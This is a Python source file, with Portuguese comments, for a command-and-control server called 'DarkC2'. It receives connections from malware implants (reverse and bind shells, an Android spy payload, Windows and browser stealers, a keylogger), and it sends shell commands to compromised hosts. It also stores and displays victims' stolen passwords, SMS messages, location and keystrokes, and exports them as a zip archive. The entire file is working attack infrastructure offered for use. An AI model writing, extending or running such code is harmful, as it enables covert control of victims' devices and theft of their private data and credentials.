#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import socket
import threading
import json
import base64
import hashlib
import time
from datetime import datetime
from cryptography.fernet import Fernet
from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich.text import Text
from rich.progress import Progress
from rich.prompt import Prompt, Confirm, IntPrompt
from rich.layout import Layout
from rich.live import Live
from rich.syntax import Syntax

console = Console()

class DarkC2Server:
    def __init__(self):
        self.host = "0.0.0.0"
        self.port = 6666
        self.clients = {}
        self.session_counter = 0
        self.server_key = Fernet.generate_key()
        self.cipher = Fernet(self.server_key)
        self.data_dir = "collected_data"
        self._setup()
        
        # Dicionário para mapear tipos de payload para funções de tratamento
        self.payload_handlers = {
            "reverse_tcp": self._handle_shell_session,
            "bind_tcp": self._handle_shell_session,
            "termux_espiao": self._handle_termux_data,
            "windows_stealer": self._handle_windows_data,
            "browser_stealer": self._handle_browser_data,
            "keylogger": self._handle_keylogger_data
        }

    def _setup(self):
        """Configuração inicial do servidor"""
        if not os.path.exists(self.data_dir):
            os.makedirs(self.data_dir)
        
        # Cria arquivo de chaves de sessão
        if not os.path.exists("session_keys.txt"):
            with open("session_keys.txt", "w") as f:
                f.write(f"CHAVE-MESTRA: {self.server_key.decode()}\n")

    def _show_banner(self):
        banner = """
[bold red]
 ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄  
▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░▌ 
▐░█▀▀▀▀▀▀▀▀▀ ▐░█▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀▀▀ ▐░█▀▀▀▀▀▀▀▀▀ ▐░█▀▀▀▀▀▀▀█░▌
▐░▌          ▐░▌       ▐░▌▐░▌          ▐░▌          ▐░▌       ▐░▌
▐░█▄▄▄▄▄▄▄▄▄ ▐░█▄▄▄▄▄▄▄█░▌▐░█▄▄▄▄▄▄▄▄▄ ▐░█▄▄▄▄▄▄▄▄▄ ▐░▌       ▐░▌
▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░▌       ▐░▌
▐░█▀▀▀▀▀▀▀▀▀ ▐░█▀▀▀▀█░█▀▀  ▀▀▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀▀▀ ▐░▌       ▐░▌
▐░▌          ▐░▌     ▐░▌            ▐░▌▐░▌          ▐░▌       ▐░▌
▐░▌          ▐░▌      ▐░▌  ▄▄▄▄▄▄▄▄▄█░▌▐░█▄▄▄▄▄▄▄▄▄ ▐░█▄▄▄▄▄▄▄█░▌
▐░▌          ▐░▌       ▐░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░▌ 
 ▀            ▀         ▀  ▀▀▀▀▀▀▀▀▀▀▀  ▀▀▀▀▀▀▀▀▀▀▀  ▀▀▀▀▀▀▀▀▀▀  
[/bold red]
[bold white on red]        DARK C2 SERVER - PAYLOAD RECEIVER EDITION[/bold white on red]
[blink bold red]⚠️ TODAS AS CONEXÕES SÃO LOGADAS E MONITORADAS ⚠️[/blink bold red]
"""
        console.print(banner)

    def _log_event(self, event_type, client_ip, details=""):
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        log_entry = f"[{timestamp}] [{event_type}] {client_ip} {details}\n"
        
        with open("c2_server.log", "a") as f:
            f.write(log_entry)
        
        if "NOVA" in event_type:
            console.print(f"[green][{timestamp}][/green] [bold white on green]{event_type}[/bold white on green] {client_ip} {details}")
        elif "DADO" in event_type:
            console.print(f"[blue][{timestamp}][/blue] [bold white on blue]{event_type}[/bold white on blue] {client_ip} {details}")
        elif "ERRO" in event_type:
            console.print(f"[red][{timestamp}][/red] [bold white on red]{event_type}[/bold white on red] {client_ip} {details}")

    def _handle_client(self, conn, addr):
        """Manipula a conexão com um cliente"""
        client_ip = addr[0]
        session_id = f"SESS-{self.session_counter:04d}-{hashlib.md5(client_ip.encode()).hexdigest()[:6]}"
        self.session_counter += 1
        
        try:
            # Envia chave de sessão criptografada
            session_key = Fernet.generate_key()
            encrypted_key = self.cipher.encrypt(session_key)
            conn.sendall(encrypted_key + b"\nEND_KEY\n")
            
            self.clients[session_id] = {
                "ip": client_ip,
                "session_key": session_key,
                "last_seen": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                "status": "ACTIVE",
                "conn": conn,
                "payload_type": "unknown",
                "platform": "unknown"
            }
            
            self._log_event("NOVA-CONEXAO", client_ip, f"Sessão: {session_id}")
            
            while True:
                data = conn.recv(4096)
                if not data:
                    break
                
                try:
                    # Decripta os dados recebidos
                    decrypted_data = Fernet(session_key).decrypt(data).decode()
                    
                    # Verifica se é um handshake inicial
                    if decrypted_data.startswith("HANDSHAKE:"):
                        handshake_data = json.loads(decrypted_data[10:])
                        self.clients[session_id]["payload_type"] = handshake_data.get("payload_type", "unknown")
                        self.clients[session_id]["platform"] = handshake_data.get("platform", "unknown")
                        self._log_event("HANDSHAKE", client_ip, 
                                       f"Tipo: {handshake_data.get('payload_type')} | Plataforma: {handshake_data.get('platform')}")
                        continue
                    
                    # Processa de acordo com o tipo de payload
                    self._process_payload_data(session_id, decrypted_data)
                        
                except Exception as e:
                    self._log_event("ERRO-PROCESSAMENTO", client_ip, f"Erro: {str(e)}")
                    continue
                    
        except Exception as e:
            self._log_event("ERRO-CONEXAO", client_ip, f"Erro: {str(e)}")
        finally:
            conn.close()
            self.clients[session_id]["status"] = "DISCONNECTED"
            self._log_event("CONEXAO-ENCERRADA", client_ip, f"Sessão: {session_id}")

    def _process_payload_data(self, session_id, data):
        """Processa dados recebidos de acordo com o tipo de payload"""
        client = self.clients.get(session_id)
        if not client:
            return
        
        payload_type = client["payload_type"]
        
        # Verifica se há um handler específico para este tipo de payload
        handler = self.payload_handlers.get(payload_type, self._handle_unknown_payload)
        handler(session_id, data)

    def _handle_shell_session(self, session_id, data):
        """Manipula sessões de shell (reverse_tcp/bind_tcp)"""
        client = self.clients[session_id]
        
        try:
            # Tenta parsear como JSON (pode ser saída estruturada)
            parsed_data = json.loads(data)
            self._save_client_data(session_id, "shell_output", parsed_data)
            self._log_event("SHELL-OUTPUT", client["ip"], 
                          f"Comando: {parsed_data.get('command')} | Saída: {len(parsed_data.get('output', ''))} bytes")
        except json.JSONDecodeError:
            # Se não for JSON, trata como saída bruta do shell
            self._save_client_data(session_id, "shell_raw", {"output": data})
            self._log_event("SHELL-RAW", client["ip"], f"Saída: {len(data)} bytes")

    def _handle_termux_data(self, session_id, data):
        """Manipula dados do payload termux_espiao"""
        client = self.clients[session_id]
        
        try:
            parsed_data = json.loads(data)
            self._save_client_data(session_id, "termux_data", parsed_data)
            
            # Extrai informações importantes
            sms_count = len(parsed_data.get("sms", [])) if isinstance(parsed_data.get("sms"), list) else 0
            location = parsed_data.get("location", {})
            
            self._log_event("TERMUX-DATA", client["ip"], 
                          f"SMS: {sms_count} | Localização: {location.get('latitude', '?')},{location.get('longitude', '?')}")
            
        except json.JSONDecodeError as e:
            self._log_event("ERRO-TERMUX", client["ip"], f"Dados inválidos: {str(e)}")

    def _handle_windows_data(self, session_id, data):
        """Manipula dados do payload windows_stealer"""
        client = self.clients[session_id]
        
        try:
            parsed_data = json.loads(data)
            self._save_client_data(session_id, "windows_data", parsed_data)
            
            # Extrai informações do sistema
            system_info = parsed_data.get("system", {})
            users = parsed_data.get("users", [])
            
            self._log_event("WINDOWS-DATA", client["ip"], 
                          f"Sistema: {system_info.get('system', '?')} | Usuários: {len(users)}")
            
        except json.JSONDecodeError as e:
            self._log_event("ERRO-WINDOWS", client["ip"], f"Dados inválidos: {str(e)}")

    def _handle_browser_data(self, session_id, data):
        """Manipula dados do payload browser_stealer"""
        client = self.clients[session_id]
        
        try:
            parsed_data = json.loads(data)
            self._save_client_data(session_id, "browser_data", parsed_data)
            
            # Extrai credenciais
            credentials = parsed_data.get("passwords", [])
            unique_sites = len({cred[0] for cred in credentials if len(cred) > 0})
            
            self._log_event("BROWSER-DATA", client["ip"], 
                          f"Credenciais: {len(credentials)} | Sites: {unique_sites}")
            
        except json.JSONDecodeError as e:
            self._log_event("ERRO-BROWSER", client["ip"], f"Dados inválidos: {str(e)}")

    def _handle_keylogger_data(self, session_id, data):
        """Manipula dados do payload keylogger"""
        client = self.clients[session_id]
        
        try:
            parsed_data = json.loads(data)
            self._save_client_data(session_id, "keylogger_data", parsed_data)
            
            # Analisa teclas pressionadas
            keystrokes = parsed_data.get("keystrokes", "")
            words = len(keystrokes.split())
            
            self._log_event("KEYLOGGER-DATA", client["ip"], 
                          f"Teclas: {len(keystrokes)} | Palavras: {words}")
            
        except json.JSONDecodeError:
            # Se não for JSON, trata como log direto
            self._save_client_data(session_id, "keylogger_raw", {"output": data})
            self._log_event("KEYLOGGER-RAW", client["ip"], f"Teclas: {len(data)}")

    def _handle_unknown_payload(self, session_id, data):
        """Manipula payloads de tipo desconhecido"""
        client = self.clients[session_id]
        self._save_client_data(session_id, "unknown_data", {"raw": data})
        self._log_event("UNKNOWN-DATA", client["ip"], f"Tamanho: {len(data)} bytes")

    def _save_client_data(self, session_id, data_type, data):
        """Salva dados recebidos do cliente"""
        client_dir = os.path.join(self.data_dir, session_id)
        if not os.path.exists(client_dir):
            os.makedirs(client_dir)
        
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"{data_type}_{timestamp}.json"
        filepath = os.path.join(client_dir, filename)
        
        with open(filepath, "w") as f:
            json.dump(data, f)

    def _show_dashboard(self):
        """Exibe o dashboard interativo do C2"""
        layout = Layout()
        layout.split(
            Layout(name="header", size=3),
            Layout(name="main", ratio=1),
            Layout(name="footer", size=7)
        )
        
        layout["main"].split_row(
            Layout(name="sessions", ratio=2),
            Layout(name="details", ratio=3)
        )
        
        with Live(layout, refresh_per_second=4, screen=True) as live:
            while True:
                # Atualiza o cabeçalho
                active_clients = sum(1 for c in self.clients.values() if c["status"] == "ACTIVE")
                total_clients = len(self.clients)
                
                layout["header"].update(
                    Panel.fit(
                        f"[bold]DarkC2 Server[/bold] | [green]Ativos: {active_clients}[/green] | [yellow]Total: {total_clients}[/yellow] | [cyan]Porta: {self.port}[/cyan]",
                        border_style="blue"
                    )
                )
                
                # Atualiza a lista de sessões
                sessions_table = Table(show_header=True, header_style="bold magenta")
                sessions_table.add_column("ID", style="cyan")
                sessions_table.add_column("IP", style="green")
                sessions_table.add_column("Tipo")
                sessions_table.add_column("Status", style="red")
                sessions_table.add_column("Plataforma")
                
                for sess_id, client in sorted(self.clients.items(), 
                                            key=lambda x: x[1]["last_seen"], reverse=True):
                    status_style = "green" if client["status"] == "ACTIVE" else "red"
                    sessions_table.add_row(
                        sess_id,
                        client["ip"],
                        client["payload_type"],
                        f"[{status_style}]{client['status']}[/{status_style}]",
                        client["platform"]
                    )
                
                layout["sessions"].update(Panel(sessions_table))
                
                # Menu de controle
                menu = """
[bold]COMANDOS DISPONÍVEIS:[/bold]
1. Enviar comando para shell
2. Visualizar dados coletados
3. Exportar sessões
4. Limpar console
0. Encerrar servidor
"""
                layout["footer"].update(Panel.fit(menu, border_style="yellow"))
                
                # Aguarda entrada do usuário
                try:
                    choice = Prompt.ask(
                        "[blink red]➤[/blink red] Selecione uma opção",
                        choices=["0", "1", "2", "3", "4"],
                        show_choices=False,
                        timeout=1
                    )
                    
                    if choice == "0":
                        self._shutdown_server()
                        break
                    elif choice == "1":
                        self._send_shell_command()
                    elif choice == "2":
                        self._view_collected_data()
                    elif choice == "3":
                        self._export_sessions()
                    elif choice == "4":
                        continue
                
                except TimeoutError:
                    continue

    def _send_shell_command(self):
        """Envia comando para uma sessão de shell"""
        if not self.clients:
            console.print("[red]Nenhum cliente conectado![/red]")
            input("\nPressione Enter para continuar...")
            return
        
        # Filtra apenas clientes com sessões de shell
        shell_sessions = {k: v for k, v in self.clients.items() 
                         if v["payload_type"] in ["reverse_tcp", "bind_tcp"] and v["status"] == "ACTIVE"}
        
        if not shell_sessions:
            console.print("[red]Nenhuma sessão de shell ativa![/red]")
            input("\nPressione Enter para continuar...")
            return
        
        # Selecionar sessão
        table = Table(title="Sessões de Shell Ativas", show_header=True, header_style="bold blue")
        table.add_column("ID", style="cyan")
        table.add_column("IP", style="green")
        table.add_column("Plataforma")
        
        sessions_list = list(shell_sessions.items())
        for i, (sess_id, client) in enumerate(sessions_list, 1):
            table.add_row(str(i), client["ip"], client["platform"])
        
        console.print(table)
        
        try:
            choice = IntPrompt.ask(
                "[yellow]?[/yellow] Selecione a sessão (0 para cancelar)",
                choices=[str(i) for i in range(0, len(sessions_list)+1)],
                show_choices=False
            )
            
            if choice == 0:
                return
                
            selected_session = sessions_list[choice-1][0]
            selected_client = sessions_list[choice-1][1]
            
            # Solicita comando
            command = Prompt.ask(
                f"[yellow]?[/yellow] Comando para {selected_client['ip']}",
                default="whoami"
            )
            
            # Envia o comando
            success, message = self._send_command_to_session(selected_session, json.dumps({
                "type": "command",
                "command": command
            }))
            
            if success:
                console.print(f"[green]✓ Comando enviado para {selected_client['ip']}[/green]")
            else:
                console.print(f"[red]✗ Erro: {message}[/red]")
            
        except Exception as e:
            console.print(f"[red]Erro: {str(e)}[/red]")
        
        input("\nPressione Enter para continuar...")

    def _view_collected_data(self):
        """Exibe dados coletados dos clientes"""
        if not os.path.exists(self.data_dir) or not os.listdir(self.data_dir):
            console.print("[red]Nenhum dado coletado ainda![/red]")
            input("\nPressione Enter para continuar...")
            return
        
        # Lista sessões com dados
        sessions = [d for d in os.listdir(self.data_dir) 
                   if os.path.isdir(os.path.join(self.data_dir, d))]
        
        table = Table(title="Sessões com dados coletados", show_header=True, header_style="bold blue")
        table.add_column("ID", style="cyan")
        table.add_column("IP", style="green")
        table.add_column("Tipo")
        table.add_column("Arquivos", style="yellow")
        
        for i, sess_id in enumerate(sessions, 1):
            client = self.clients.get(sess_id, {})
            files = len(os.listdir(os.path.join(self.data_dir, sess_id)))
            table.add_row(str(i), client.get("ip", "DESCONHECIDO"), 
                         client.get("payload_type", "unknown"), str(files))
        
        console.print(table)
        
        try:
            choice = IntPrompt.ask(
                "[yellow]?[/yellow] Selecione a sessão para ver (0 para cancelar)",
                choices=[str(i) for i in range(0, len(sessions)+1)],
                show_choices=False
            )
            
            if choice == 0:
                return
                
            selected_session = sessions[choice-1]
            self._show_session_data(selected_session)
            
        except Exception as e:
            console.print(f"[red]Erro: {str(e)}[/red]")
            input("\nPressione Enter para continuar...")

    def _show_session_data(self, session_id):
        """Mostra dados de uma sessão específica"""
        session_dir = os.path.join(self.data_dir, session_id)
        files = sorted(os.listdir(session_dir), reverse=True)
        
        while True:
            console.clear()
            client = self.clients.get(session_id, {})
            
            console.print(Panel.fit(
                f"[bold]DADOS DA SESSÃO: [cyan]{session_id}[/cyan][/bold]\n"
                f"IP: [green]{client.get('ip', 'DESCONHECIDO')}[/green] | "
                f"Tipo: [yellow]{client.get('payload_type', 'unknown')}[/yellow] | "
                f"Plataforma: [magenta]{client.get('platform', 'unknown')}[/magenta]",
                border_style="blue"
            ))
            
            table = Table(show_header=True, header_style="bold magenta")
            table.add_column("ID", style="cyan")
            table.add_column("Arquivo", style="green")
            table.add_column("Tamanho", style="yellow")
            
            for i, filename in enumerate(files[:20], 1):  # Limita a 20 arquivos
                filepath = os.path.join(session_dir, filename)
                size = os.path.getsize(filepath)
                table.add_row(str(i), filename, f"{size} bytes")
            
            console.print(table)
            
            if len(files) > 20:
                console.print(f"[yellow]... mostrando 20 de {len(files)} arquivos[/yellow]")
            
            choice = Prompt.ask(
                "[yellow]?[/yellow] Selecione um arquivo para ver (0 para voltar)",
                choices=[str(i) for i in range(0, min(20, len(files))+1)],
                show_choices=False
            )
            
            if choice == "0":
                return
                
            selected_file = files[int(choice)-1]
            self._display_file_content(session_dir, selected_file)

    def _display_file_content(self, session_dir, filename):
        """Exibe o conteúdo de um arquivo de dados"""
        filepath = os.path.join(session_dir, filename)
        
        try:
            with open(filepath, "r") as f:
                data = json.load(f)
            
            console.print(Panel.fit(
                f"[bold]Conteúdo de {filename}[/bold]",
                border_style="green"
            ))
            
            # Formata a saída de acordo com o tipo de dados
            if "shell_output" in filename or "command" in str(data):
                console.print(Syntax(json.dumps(data, indent=2), "json"))
            elif "termux_data" in filename:
                self._display_termux_data(data)
            elif "windows_data" in filename:
                self._display_windows_data(data)
            elif "browser_data" in filename:
                self._display_browser_data(data)
            elif "keylogger_data" in filename:
                self._display_keylogger_data(data)
            else:
                console.print(Syntax(json.dumps(data, indent=2), "json"))
            
            input("\nPressione Enter para continuar...")
        except Exception as e:
            console.print(f"[red]Erro ao ler arquivo: {str(e)}[/red]")
            input("\nPressione Enter para continuar...")

    def _display_termux_data(self, data):
        """Exibe dados do payload termux_espiao"""
        table = Table(title="[bold]Dados Termux[/bold]", show_header=True, header_style="bold blue")
        table.add_column("Tipo", style="cyan")
        table.add_column("Informação", style="green")
        
        # Informações do dispositivo
        device = data.get("device", "").split()
        if len(device) > 2:
            table.add_row("Sistema", f"{device[0]} {device[2]}")
        
        # SMS
        sms = data.get("sms", [])
        table.add_row("SMS", f"{len(sms)} mensagens")
        
        # Localização
        loc = data.get("location", {})
        if "latitude" in loc:
            table.add_row("Localização", f"{loc.get('latitude')}, {loc.get('longitude')}")
        
        console.print(table)

    def _display_windows_data(self, data):
        """Exibe dados do payload windows_stealer"""
        table = Table(title="[bold]Dados Windows[/bold]", show_header=True, header_style="bold blue")
        table.add_column("Tipo", style="cyan")
        table.add_column("Informação", style="green")
        
        # Informações do sistema
        system = data.get("system", {})
        table.add_row("Sistema", f"{system.get('system', '?')} {system.get('release', '?')}")
        table.add_row("Nó", system.get("node", "?"))
        table.add_row("Processador", system.get("machine", "?"))
        
        # Usuários
        users = data.get("users", [])
        table.add_row("Usuários", ", ".join(users[:3]) + (f" e mais {len(users)-3}" if len(users) > 3 else ""))
        
        console.print(table)

    def _display_browser_data(self, data):
        """Exibe dados do payload browser_stealer"""
        credentials = data.get("passwords", [])
        
        table = Table(title="[bold]Credenciais Roubadas[/bold]", show_header=True, header_style="bold blue")
        table.add_column("Site", style="cyan")
        table.add_column("Usuário", style="green")
        table.add_column("Senha", style="red")
        
        for cred in credentials[:10]:  # Limita a 10 credenciais
            if len(cred) >= 3:
                table.add_row(cred[0], cred[1], cred[2][:20] + "..." if len(cred[2]) > 20 else cred[2])
        
        if len(credentials) > 10:
            console.print(f"[yellow]... mostrando 10 de {len(credentials)} credenciais[/yellow]")
        
        console.print(table)

    def _display_keylogger_data(self, data):
        """Exibe dados do payload keylogger"""
        keystrokes = data.get("keystrokes", "")
        
        console.print(Panel.fit(
            "[bold]Teclas Capturadas[/bold]",
            border_style="yellow"
        ))
        
        console.print(Syntax(keystrokes[:1000], "text"))  # Limita a 1000 caracteres
        
        if len(keystrokes) > 1000:
            console.print(f"[yellow]... mostrando 1000 de {len(keystrokes)} caracteres[/yellow]")

    def _export_sessions(self):
        """Exporta dados das sessões para um arquivo compactado"""
        console.print("[cyan]▶ Preparando exportação de dados...[/cyan]")
        
        try:
            import zipfile
            export_file = f"c2_export_{datetime.now().strftime('%Y%m%d_%H%M%S')}.zip"
            
            with zipfile.ZipFile(export_file, 'w', zipfile.ZIP_DEFLATED) as zipf:
                for root, dirs, files in os.walk(self.data_dir):
                    for file in files:
                        filepath = os.path.join(root, file)
                        arcname = os.path.relpath(filepath, self.data_dir)
                        zipf.write(filepath, arcname)
            
            console.print(Panel.fit(
                f"[green]✓ Dados exportados para [bold]{export_file}[/bold][/green]",
                title="[bold green]SUCESSO[/bold green]",
                border_style="green"
            ))
            
        except Exception as e:
            console.print(Panel.fit(
                f"[red]✗ Erro ao exportar dados: {str(e)}[/red]",
                title="[bold red]ERRO[/bold red]",
                border_style="red"
            ))
        
        input("\nPressione Enter para continuar...")

    def _shutdown_server(self):
        """Encerra o servidor de forma controlada"""
        console.print(Panel.fit(
            "[blink bold red]⛧ ENCERRANDO SERVIDOR C2 ⛧[/blink bold red]",
            border_style="red"
        ))
        
        with Progress() as progress:
            task = progress.add_task("[red]Encerrando...[/red]", total=100)
            for i in range(100):
                progress.update(task, advance=1)
                time.sleep(0.02)
        
        console.print("[cyan]Registros de log salvos em c2_server.log[/cyan]")
        console.print("[red]Servidor encerrado.[/red]")
        time.sleep(1)

    def start(self):
        """Inicia o servidor C2"""
        self._show_banner()
        
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                s.bind((self.host, self.port))
                s.listen(5)
                
                console.print(Panel.fit(
                    f"[bold green]Servidor C2 ativo em [yellow]{self.host}:{self.port}[/yellow][/bold green]\n"
                    f"[cyan]Chave mestra:[/cyan] [bold]{self.server_key.decode()}[/bold]",
                    border_style="green"
                ))
                
                # Thread para aceitar conexões
                def accept_connections():
                    while True:
                        conn, addr = s.accept()
                        client_thread = threading.Thread(
                            target=self._handle_client,
                            args=(conn, addr),
                            daemon=True
                        )
                        client_thread.start()
                
                accept_thread = threading.Thread(target=accept_connections, daemon=True)
                accept_thread.start()
                
                # Inicia dashboard interativo
                self._show_dashboard()
                
        except Exception as e:
            console.print(Panel.fit(
                f"[bold red]ERRO: {str(e)}[/bold red]",
                border_style="red"
            ))
            sys.exit(1)

if __name__ == '__main__':
    server = DarkC2Server()
    server.start()
